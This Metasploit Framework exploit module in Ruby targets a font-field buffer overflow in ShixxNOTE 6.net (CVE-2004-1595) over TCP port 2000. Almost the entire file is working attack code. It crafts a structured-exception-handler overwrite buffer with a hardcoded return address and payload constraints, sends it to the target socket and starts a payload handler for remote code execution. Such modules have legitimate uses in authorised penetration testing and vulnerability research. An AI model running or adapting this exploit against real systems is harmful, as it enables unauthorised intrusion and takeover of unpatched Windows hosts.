##
# $Id: shixxnote_font.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ShixxNOTE 6.net Font Field Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in ShixxNOTE 6.net.
				The vulnerability is caused due to boundary errors in the
				handling of font fields.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					['CVE', '2004-1595'],
					['OSVDB', '10721'],
					['BID', '11409'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 650,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',

			'Targets'        =>
				[
					[ 'ShixxNOTE 6.net Universal', { 'Ret' => 0x10041951 } ],
				],

			'Privileged'     => false,

			'DisclosureDate' => 'Oct 4 2004',

			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(2000)
			], self.class)

	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		sploit  =  rand_text_alpha_upper(8, payload_badchars)
		sploit  += "~~"
		sploit  += rand_text_alpha_upper(118, payload_badchars)

		seh     =  generate_seh_payload(target.ret)

		sploit[112, seh.length] = seh
		sploit  += rand_text_alpha_upper(200, payload_badchars)
		sploit  += "~" * 10

		sock.put(sploit)

		handler
		disconnect
	end

end